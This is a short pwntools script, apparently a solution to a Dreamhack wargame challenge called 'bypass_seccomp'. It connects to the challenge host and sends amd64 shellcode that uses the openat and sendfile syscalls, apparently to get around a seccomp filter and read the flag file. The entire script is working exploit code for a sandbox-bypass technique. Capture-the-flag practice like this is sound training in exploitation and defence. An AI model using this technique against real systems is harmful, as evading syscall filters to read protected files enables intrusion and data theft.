#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./bypass_seccomp')

# p = process('./bypass_seccomp')
p = remote('host3.dreamhack.games', 11734)
shellcode = shellcraft.openat(0, '/home/bypass_seccomp/flag')
shellcode += shellcraft.sendfile(1, 'rax', 0, 0xcafe)
payload = asm(shellcode)
p.sendafter(b'shellcode: ', payload)
p.interactive()
